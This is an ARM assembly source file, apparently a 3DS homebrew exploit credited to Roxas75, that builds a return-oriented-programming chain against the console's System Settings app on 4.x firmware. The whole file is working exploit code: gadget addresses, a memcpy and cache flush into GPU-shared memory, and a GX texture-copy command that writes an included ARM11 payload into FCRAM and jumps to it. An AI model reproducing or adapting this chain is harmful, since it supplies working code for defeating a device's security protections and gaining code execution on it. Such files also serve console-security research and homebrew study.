@-----------------------------------------------@
@   firmlaunchax - arm9 kernel code execution   @
@       on mset (system settings) exploit.      @
@             FOR 4.X CONSOLES ONLY             @
@   -Roxas75                                    @
@-----------------------------------------------@

@.create "build/rop.bin", 0x2B0000
.arm
.align 2

.equ  pop_pc,                                    0x001002F9
.equ  pop_r0,                                    0x00143D8C
.equ  pop_r0_r2,                                 0x0010f2b9
.equ  pop_r3,                                    0x0010538C
.equ  pop_r1,                                    0x001549E1
.equ  pop_r4_lr_bx_r1,                           0x001182C0
.equ  pop_r0_r4,                                 0x0016FE91

.equ  memcpy,                                    0x001BFA60
.equ  GSPGPU_FlushDataCache,                     0x0013C5D4
.equ  nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue, 0x001AC924
.equ  svcSleepThread,                            0x001AEA50
.equ  ifile_open,                                0x001B82A8
.equ  ifile_read,                                0x001B3954
.equ  ifile_write,                               0x001B3B50
.equ  ssl_dec,                                   0x0022EFA8

.equ  gsp_addr,                                  0x14000000
.equ  gsp_handle,                                0x0027FAC4
.equ  gsp_code_addr,                             0x00700000
.equ  fcram_code_addr,                           0x03E6D000
.equ  payload_addr,                              0x00140000

initial_rop:

    memcpy_code:
        .word pop_r1
            .word pop_pc
        .word pop_r4_lr_bx_r1
            .word 0x44444444
            .word pop_pc
        .word pop_r1
            .word arm_code
        .word pop_r0_r2
            .word gsp_addr+gsp_code_addr
            .word arm_code_end-arm_code
        .word memcpy

    flush_data_cache:
        .word pop_r0_r2
            .word gsp_handle
            .word gsp_addr+gsp_code_addr
        .word pop_r1
            .word 0xFFFF8001
        .word pop_r3
            .word arm_code_end-arm_code
        .word GSPGPU_FlushDataCache+4   @ pop {r4-r6,pc}
            .word 0x44444444
            .word 0x55555555
            .word 0x66666666

    send_gx_command:
        .word pop_r0
            .word 0x27c580+0x58
        .word pop_r1
            .word gxCommand
        .word nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue+4       @ LDMFD   SP!, {R4-R8,PC}
            .word 0x44444444
            .word 0x55555555
            .word 0x66666666
            .word 0x77777777
            .word 0x88888888
            .word pop_pc
            .word pop_pc
            .word pop_pc

    sleep_thread:
        .word pop_r1
            .word pop_pc
        .word pop_r4_lr_bx_r1
            .word 0x44444444
            .word pop_r0
        .word pop_r0
            .word 0x3B9ACA00
        .word pop_r1
            .word 0x00000000
        .word svcSleepThread
            .word 0x00000000
        .word pop_r1
            .word 0x00000000

    jump_to_code:
        .word 0x100000+payload_addr+0x10

.align 4
gxCommand:
	.word 0x00000004 @ SetTextureCopy
	.word gsp_addr+gsp_code_addr @ source
	.word gsp_addr+fcram_code_addr+payload_addr   @ destination
	.word arm_code_end-arm_code  @ size
	.word 0x0 @ dim in
	.word 0x0 @ dim out
	.word 0x00000008 @ flags
	.word 0x00000000 @ unused

.align 16
arm_code:
    .incbin "build/arm11hax.bin"
    .fill 4,4,0xdeadbeef
arm_code_end:

.pool
